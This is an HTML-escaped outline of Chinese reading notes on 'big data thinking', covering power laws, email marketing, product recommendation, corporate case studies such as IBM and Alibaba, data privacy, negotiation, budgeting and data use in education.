&lt;div id=&quot;outline-container-orgcd1cb75&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgcd1cb75&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.1&lt;/span&gt; 幂律思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;幂律是大数据所遵循的基本定理，什么是幂律？它指的是几何平均定值，如有一万个连线的大节点有十个，有一千个连线的中节点有一百个，一百个连线的小节点有一千个……在对数坐标上画出来会得到一条斜向下的直线。&lt;/li&gt;
&lt;li&gt;幂律和爆发点的相伴相生&lt;/li&gt;
&lt;li&gt;爆发改变了一切&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org19bf83c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org19bf83c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.2&lt;/span&gt; 效率思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据的精准和效率&lt;/li&gt;
&lt;li&gt;大数据能掌控电视剧收视率&lt;/li&gt;
&lt;li&gt;大数据还能追女朋友&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdeec867&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdeec867&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.3&lt;/span&gt; 邮件思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;邮件思维是什么？是在用户默许的情况下，通过电子邮件的方式向用户传递有价值信息的一种营销手段。营销手段是利用邮件与用户、客户进行商业交流的一种直销方式。&lt;/li&gt;
&lt;li&gt;会员才是邮件营销的核心，与传统的纸质邮件相比，邮件营销更高效、更快捷。&lt;/li&gt;
&lt;li&gt;大数据时代的邮件营销
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;邮件营销最注重的是数据信息的收集和整合，各行各业都希望用“短平快”的方式，直接购买邮件地址，不断地给用户或客户发送营销邮件，从而明确目标群，获得订单。但这种营销的效果越来越不明显。&lt;/li&gt;
&lt;li&gt;由于多年来在邮件营销领域的经验和积累，webpower获得了海量的用户数据信息。通过对这些数据的分析和整理，webpower将为客户带来昂贵的价值。在大数据技术的支持和帮助下，webpower可以针对用户点击的内容进行深入分析和挖掘，为其制定个性化的邮件策略。此外，webpower还可以对用户使用邮箱的历史数据，设定为触发式邮件。在必要的时候，可以启用短信、微信等参与进来，提醒用户哪些是有价值的营销邮件。&lt;/li&gt;
&lt;li&gt;邮件营销与网络营销、数据库营销以及新媒体等的结合越来越紧密。如何提升邮件营销给企业带来更大的价值，是IT行业急需探索的问题。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2ee07fd&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2ee07fd&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.4&lt;/span&gt; 定位思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;网站零售在挖掘顾客喜好时运用了两种方式。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一种方式是从消费者的购买行为上来判断他们之间相同的地方。比如，当你在网上买电子产品时，网站就会跳出对话框或在网页下端提醒你—购买这款电子产品的人也购买了其他哪些电子产品。就是这样，网站零售商找到了“人以群分”的结合点。&lt;/li&gt;
&lt;li&gt;第二种方式是从商品上入手，网络零售商通过判断商品之间的关联性推荐给消费者。比如，你想要买一件裤装，网站就会推荐一款T恤或衬衫，从而找到“物以类聚”的结合点。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;余额宝的成功，最重要的就是定位准确。天弘基金副总经理，增利宝余额宝项目组组长周晓明此前曾表示：“小公司走老路，干是找死，不干是等死。穷则思变，中小公司一定要创新。”&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgae69825&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgae69825&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.5&lt;/span&gt; 逆向思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;股神巴菲特有这样的一句名言：别人贪婪时我恐惧，别人恐惧时我贪婪。换句话理解，就是人们需要有一种逆向思维，这也是对创新的另一种理解。&lt;/li&gt;
&lt;li&gt;IBM公司曾经是世界上最大的计算机公司，也曾是世界上经济效益最好的计算机公司。1985年，IBM公司的通用大型机毛利率高达85%，中小型机毛利率高达50%，占世界通用大中型计算机市场的70%。到了20世纪80年代后期开始，计算机开始向小型化的个人电脑发展。到了1993年，IBM公司连续亏损，亏损的金额高达168亿美元。为了集中精力进行硬件开发，IBM公司就把个人电脑的操作系统授权给了微软公司。随着IBM个人电脑兼容机的大规模普及，微软和英特尔占据了个人电脑产业系统的核心位置，而IBM硬件则逐渐被边缘化了。&lt;/li&gt;
&lt;li&gt;苹果公司运用逆向思维，另辟蹊径，用一种全新的方式建立了新的产业形态，撼动了微软和英特尔的领导地位。&lt;/li&gt;
&lt;li&gt;逆向思维运用得好，就会将缺点变成优点，把不可能变成可能。&lt;/li&gt;
&lt;li&gt;纵观这些企业之间的竞争和案例，无不告诉我们这样一个道理：“当你面对强手的时候，千万不要被对方牵着鼻子走，而是寻找到自己的节奏，迈出适合自己的步伐，脚踏实地，并懂得“想他人所想不到，做他人所做不到”。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga980a8f&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orga980a8f&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;5&lt;/span&gt; 大数据能量的积累与爆发&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-5&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org35af599&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org35af599&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.1&lt;/span&gt; 关联思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;从数据中寻找出一定的相关关系，通过这种关系，大数据会做出预测，从而告诉大众结果。这就是大数据方法论的核心思想。&lt;/li&gt;
&lt;li&gt;麻省理工学院气象学家洛伦兹曾向人们介绍过一种现象—“蝴蝶效应”。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;一只南美洲亚马孙河流域热带雨林中的蝴蝶，偶尔扇动几下翅膀，两周后，美国得克萨斯州掀起了一场龙卷风。从表面上看来，似乎这之间毫无关系，但结果告诉我们，即使是微小的事情也极有可能与千里之外的一件事情发生关联，并带来改变。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9dfd38f&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9dfd38f&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.2&lt;/span&gt; 双刃思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据时代”的隐患：只要你在网络上活动，无论你在做些什么，都会被“记录在案”，甚至不知在什么地方，又以哪种形式被人揪出来。更可悲的是，你想不想出来的主动权不是由自己说了算，而是由网络运营商来决定。&lt;/li&gt;
&lt;li&gt;“大数据”是一把双刃剑，人们在享受大数据带来的机遇时，也不得不面临一个残酷的问题，以及可能爆发的大数据危机。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org68b444c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org68b444c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.3&lt;/span&gt; 价值思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据”真的那么具有吸引力吗？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;网络用户每点击一次鼠标，每一次刷卡消费，都已经参与了数据的生成。可以说，每一个用户都是数字的生产者和消费者。&lt;/li&gt;
&lt;li&gt;凭借如此精细的监测手段，完全可以知道一个人或一辆车的行踪，从而产生精细化的数据，用以描述各种物体、社会和整个环境的行为。有了这些数据，大大减少了社会的复杂度。&lt;/li&gt;
&lt;li&gt;在商业领域，一家美国的公司已经利用大数据，在亚马逊的云平台上处理跟天气相关的信息，从而帮助农业种植者保障自己的收益。对企业数据信息的深度挖掘和分析，能够对经济运行的状况进行准确的预警，从而做出正确的应对决策。&lt;/li&gt;
&lt;li&gt;在金融领域方面，大数据分析师都已经成为在美国华尔街基金股票分析和高频数据交易等领域最抢手的人才；在中国，阿里巴巴集团旗下的金融业务，也开始用大数据来发放“信用贷款”。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据时代带来了比以往机会更大的发展空间。这包括以下几个方面：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面，是技术创新的新空间。&lt;/li&gt;
&lt;li&gt;第二个方面是商业模式的创新。&lt;/li&gt;
&lt;li&gt;第三个方面是信息资产的经营。&lt;/li&gt;
&lt;li&gt;第四个方面是客户关系管理。&lt;/li&gt;
&lt;li&gt;第五个方面是个性化精准推荐。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0221edf&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org0221edf&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;6&lt;/span&gt; 大数据引导的商业变革&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-6&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0372e9d&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org0372e9d&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.1&lt;/span&gt; 知识思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“核心竞争力”这一理念，是由美国学者普拉哈德和哈默提出的。他们把其定义为：组织中的积累性学识，特别是关于如何协调不同的生产技能和有机结合多种技术流派的学识。&lt;/li&gt;
&lt;li&gt;大数据的核心是思想，不是技术。&lt;/li&gt;
&lt;li&gt;端到端是一个面向大数据的解决方案。英特尔的理念是在这个解决方案里实现数据价值的挖掘。所谓“端到端”，前端视频采集、分析、存储，及后端数据中心处理等。&lt;/li&gt;
&lt;li&gt;总而言之，知识经济才是提高核心竞争力的有效途径。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，知识经济时代可以识别企业核心知识，并提高企业的创新能力。&lt;/li&gt;
&lt;li&gt;其次，信息化建设可以使知识管理更有效地进行，提高企业的核心竞争力。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4830c88&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org4830c88&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.2&lt;/span&gt; 变革思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据的价值不言而喻，但也有着两面性。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;大数据催生了一批新型科技公司，吸纳科技人才就业，并为企业发展转型提供了新机遇；&lt;/li&gt;
&lt;li&gt;另外一方面，大数据给个人、企业乃至国家带来了一些危机，如隐私、重构信息安全、竞争力差距拉大以及数据产权争端等问题。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据改变了人们的生活，塑造出了不同的个性化思维。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;比如，人们白天在电脑前浏览网页或下个订单，第二天就能收到自己想要的东西；晚上出门消费，不再是给现金，而是刷卡；看电影也不再苦苦排队，而是提前团购或预订……由此，人们的行为举止都会被记录下来，从而产生数据&lt;/li&gt;
&lt;li&gt;再比如，气候公司会根据各个城市的气温高低、降雨量、土壤的状况和往年的农作物产量等情况，预测出第二年农场的产量，甚至还向农户出售个性化保险；&lt;/li&gt;
&lt;li&gt;阿里巴巴集团根据在淘宝网上中小企业的交易状况，筛选出财务健康和讲究诚信的企业，为其发放无须担保的贷款。&lt;/li&gt;
&lt;li&gt;再举个例子：我们得到了一个人的短信和通话数据、他微博的内容数据、医保和社保的数据，还有城市交通数据、签到数据、社交关系数据等。通过这些数据，我们就能对这个人形成深刻的认识，从而为其打造出完全个性化的服务。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;百度大数据关于技术方面的事例
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;百度大数据开放平台&lt;/li&gt;
&lt;li&gt;百度工业革命&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgef32fdd&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgef32fdd&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.3&lt;/span&gt; 生产思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;人类的行为是否可以被预测？&lt;/li&gt;
&lt;li&gt;如何运用“私人定制”思维？&lt;/li&gt;
&lt;li&gt;大数据“定制化”需得具备几个条件：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，要有海量的数据；&lt;/li&gt;
&lt;li&gt;其次，这些数据能够挖掘出对生产商家有价值的信息；&lt;/li&gt;
&lt;li&gt;再次，具备挖掘这样的数据的技术能力；&lt;/li&gt;
&lt;li&gt;最后，要有能力整合生产、流通和销售这些关键环节。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf34302f&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgf34302f&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.4&lt;/span&gt; 自动化思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;关于信息安全，大数据作出的最大贡献就是通过自动化分析处理与深度挖掘，将亡羊补牢式的处理，转向还没有发生前的自动化评估预测和应急措施。&lt;/li&gt;
&lt;li&gt;大数据解析航空安防和自动化
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，从目前来说，飞机是地球上最安全的旅行交通工具，比其他交通工具，如汽车、火车等安全级别高很多。&lt;/li&gt;
&lt;li&gt;其次，飞机发生事故所造成的社会影响比其他交通工具发生事故造成的社会影响更大。&lt;/li&gt;
&lt;li&gt;再次，国外的一些专家经过研究得出了一个结论，那就是：国际航班比国内航班出事故的概率要低一些。其实并非如此，所有国家的航班出现事故的概率都相差无几，并不是发达国家的国际航班就更安全一些。&lt;/li&gt;
&lt;li&gt;最后，飞行过程中的安全概率是根据起飞和爬升到巡航高度，以及下降和着陆来决定的。当然了，这也是飞行中最容易出问题的地方。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf9e386a&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgf9e386a&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.5&lt;/span&gt; 导向思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;新生的婴儿在第一时间就得学会哭泣；上学时，坐进教室的第一时间就得知道上什么课，拿什么书；进入高中后，必须规划今后的人生，上什么学、学什么专业、找什么样的姑娘或嫁什么样的男人，从事什么工作……这些，都需要一个导向思维，如果仅仅靠得过且过，明天的事明天说，犹如行尸走肉一般，一生将无建树。当然，绝大多数的人们，不会甘于现状，苛求发展，即使没有真正发展，也在内心存在这样的渴望，并独自努力。&lt;/li&gt;
&lt;li&gt;有了导向思维后，一切才会有规律地发展和进步，无论成功与否，其占据的位置都是其他特长所无法替代的。就好比当下就很火爆的阿里巴巴集团旗下的淘宝、天猫等，如果不是因马云的导向思维，怎么会有今天的互联网地位？&lt;/li&gt;
&lt;li&gt;马云的故事
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;“作为一个创业者，首先要给自己一个梦想。1995年我偶然有一次机会到了美国，然后我看见了、发现了互联网。我对技术几乎不懂，到目前为止，我对电脑的认识还是部分停留在收发邮件和浏览页面上。但是这并不重要，重要的是你到底有什么梦想。”&lt;/li&gt;
&lt;li&gt;在创业前，马云已经不缺钱了，至少是不缺吃饭的钱。在那个年代，马云是一名外语教师，还开了一间翻译社，又做夜校老师，有多个渠道的收入来源。用今天的话来说，马云已经脱离了蚁族和蜗居的时代，完全是不愁吃喝的公务员的待遇。但是，有了如此安逸闲适的生活之后，马云为何还要出来创业呢？因为，他想要的并不是这些，而是梦想，一个伟大的梦想。&lt;/li&gt;
&lt;li&gt;每个人都会说，我想要环球世界，我想要改变世界，我要让每一个人知道我的存在，为我的成功喝彩。可今天一过，继续过着朝九晚五的生活，在论坛或好友群吐槽工作的不易、上司不懂慧眼识英雄，闲时睡大觉、打游戏、三五好友瞎侃……如果你永远这样，那么你的导向思维没有起到任何作用，而仅仅是一个想法。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;IBM大数据战略导向认知计算
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;2014年3月，在IBM公司大数据新闻发布会上，IBM大中华区大数据和分析及新市场总经理，全球企业咨询服务部合伙人Jason Kelley宣布：“2014年，IBM大数据战略将持续升级在大数据方向的投入。IBM将继续深入在金融、电信、医疗、零售、制造等各行业的实践；并增强大数据与分析与云计算、移动、社交等热点趋势的融合，以及实现认知分析与大数据应用的不断融合。”&lt;/li&gt;
&lt;li&gt;IBM大中华区大数据中心总监王晓梅说：“在未来的大数据与分析实践中，IBM将进一步帮助企业把分析注入关键业务流程，从‘六大要务’角度解析业务需求，并导出对应的大数据与分析战略蓝图。当前，我们将重点推行该六大要务中对于客户洞察和流程革新的指导，帮助企业通过使用社交媒体分析等进行客户关系管理、市场营销决策，通过利用预测性维护、实时预警等进行财务等运营流程的优化。”&lt;/li&gt;
&lt;li&gt;从2005至今，IBM公司并购了35家以上的公司，比如，高速文件传输工具Aspera、IBM收购数据分析软件公司The Now Factory和备受关注的DaaS供应商Cloudant。综上所述，没有导向思维，就没有前进的动力和方向。没有大数据导向思维，就没有成功的可能性。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb09983c&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgb09983c&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;7&lt;/span&gt; 大数据的营销策略&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-7&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb15aaeb&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgb15aaeb&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.1&lt;/span&gt; 测量思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;在进行大数据测试之前，首先要对测试需求做清晰的分析。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;举个例子：假设一个本科院校的学籍管理系统主要是用来管理学生的，学生在系统中的生命周期一般是四年。根据学校现有的在校生数和五年内的每一年的招生数据，就可以分析出需要构造的各个学年下的学生数。接着，对测试需求做准确清晰的分析后，对输入的测试数据进行分析。&lt;/li&gt;
&lt;li&gt;要求主要表现在两方面：一方面要求测试数据与生产环境数据一致。另一方面，就要求测试数据输入要满足输入限制规则，尽量覆盖到满足规则的不同类型的数据。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;问题探讨：到底是什么影响人们的幸福感呢？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;随着物质生活水平的提高，生活质量越来越得到人们的重视，而且，社会的总体心态与人们的行为准则有着密不可分的联系。一些社会指标告诉人们：最容易产生负面情绪的人群，不一定是生活最困难的人群，而是期望值与自身生活水平差距较大的人群。&lt;/li&gt;
&lt;li&gt;举个例子：关于幸福感的研究，学术界的大多人士都表明，幸福感是一种感觉，并不与财富的多少以及生活水平的高低成正比。社会心理学家曾列过这样的一个公式：期望实现值除以内心的期望值才等于人的情绪指数。期望实现值与内心期望值的比值一旦大于或等于1时，人就会处于一种兴奋的状态，就会感到满足；相反，如果期望实现值与内心期望值的比值小于1时，人就会感到压抑，“唉”声连连，甚至做出一些平时不做的极端事。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org106dbdd&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org106dbdd&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.2&lt;/span&gt; 谈判思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;所谓谈判，说的就是彼此之间，为了实现某种目的而进行的一种意见交换，然后寻找到一个制衡点，寻求问题解决的途径并达成协议的过程。&lt;/li&gt;
&lt;li&gt;在商业谈判中，我们绝对不能忽略数据对谈判结果产生的影响。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;打个比方说，数据就好比是一棵大树的枝叶，而想要与另一棵大树做比较的时候，除了其主干因素外，这些枝叶就是最为明显的可比部分。也就是说，掌控足够多的数据，将在谈判过程中掌控先机。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;如何利用数据在谈判中获得优势呢？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;掌控绝对的数据&lt;/li&gt;
&lt;li&gt;还要有针对性&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;不利用数据，仅仅依靠过去经验和谈判员的弊端
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;对产品认识不足的情况很容易出现在谈判桌上，从而导致在谈判中失去主导地位。而且，由于这种产品知识比较抽象，将之比喻为对产品以及产品所在行业的市场直觉更为合适。而直觉又往往是很难通过言语表达出来的，这就使得我们很难组织出一套权威的术语来说服对方，所以，就很难赢得对方的认可。&lt;/li&gt;
&lt;li&gt;更为重要的一点是，要想形成产品知识，还和销售人员有着至关重要的关系。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org46cc23a&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org46cc23a&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.3&lt;/span&gt; 预算思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;在这个时代，财务所面对的数据规模将会越来越大，数据类型也将越来越复杂。那么，如何整理与统计这些杂乱无章的数据，让这些数据能够更直观明了地展现在人们面前，并且为企业管理者的经营决策提供有效的科学依据，则成为现阶段我们必然考虑的问题之一。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;对此问题，业内人士表示，全面预算管理将是让企业大数据“活起来”的最好方式。首先，预算是根据历年的数据和某些调整信息，对未来时期进行分析评测，进而得出的信息。其次，它是由实际业务数据和预算数据相结合与比较之后，而设计出来的一套最佳管理方案。利用这套方案，可以让企业资源得到更充分的利用，从而在未来获得更大的利益回报。&lt;/li&gt;
&lt;li&gt;笼统地说，全面预算管理解决方案是在对企业内外部大数据进行收集、处理、控制、分析、整合等的基础上，与其他工具结合，帮助企业更好地利用数据实现战略落地。&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org760ba57&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org760ba57&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.4&lt;/span&gt; 选定思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;你了解你的客户吗？你能分清你的客户群体中哪些是可以长久合作、哪些只是暂时短期的利益相互关系吗？你的营销和广告投入应该针对哪类客户群体，你都清楚吗？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;企业想要做到正确的定位客户，首先就必须先设定目标。&lt;/li&gt;
&lt;li&gt;找到有价值的客户并不代表着就一定能够进行合作。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;“建立品牌”&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgfe01b41&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgfe01b41&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;8&lt;/span&gt; 教育、教学正在大数据化&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-8&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org640b398&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org640b398&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.1&lt;/span&gt; 院校思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据”时代，如何推动和创新院校教育模式
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;区别：传统数据的整理方式能凸显学生整体的专业水平或整体素质、身体的发育状况、社会性情绪及适应性的发展，还有对学校的满意程度等。而大数据就不一样了，它具备的分析能力更广、更细腻。它可以去关注每一个学生的微观表现，比如，在考试时，他在一道题上逗留了多久；在不同学科课堂上，他开小差的次数是多少；在食堂吃饭，他喜欢吃什么，不喜欢吃什么；每个学生的出生日期，包括喜欢的颜色等。&lt;/li&gt;
&lt;li&gt;这些数据对其他个体没有意义，但所有学生的数据整合起来对大数据分析就有价值了。比如旷课、纪律或课堂表现等预测模式，教育者就可以确认哪些学生退学的可能性较高。通过利用大数据来观察并分析对学生在课堂中点滴的表现，大数据帮助我们可以了解学生对知识的掌握程度以及感兴趣程度，进而让学校反思自己的教学模式是不是满足了学生的需求。有了大数据以后，教育工作者们就可以针对不同的学生进行不同的教育模式，从而真正做到因材施教和以人为本。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;传统的院校决策模式总结为四种：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一种是通过“合意”的过程来平衡大学内多方群体利益的“学院型”模式；&lt;/li&gt;
&lt;li&gt;第二种是通过“扩散”程序表达不同权力集团、利益群体诉求的“政治型”模式；&lt;/li&gt;
&lt;li&gt;第三种是决策程序无章可循、随意性大的“有组织无政府型”模式；&lt;/li&gt;
&lt;li&gt;第四种是依靠决策者所具有的理性认知能力制定决策的“官僚主义”模式。&lt;/li&gt;
&lt;li&gt;这四种模式的共同弱点在于缺少有力的决策支持依据，管理者实际上是以“有限理性”为基础，努力做出“足够好”的决策。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;在大数据背景下的院校决策，可以为教育决策者提供和完善认知经验所缺乏的信息、知识和智慧。针对这样的情况，有学者将其称为以数据系统为支撑的“知会理性”决策模式。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
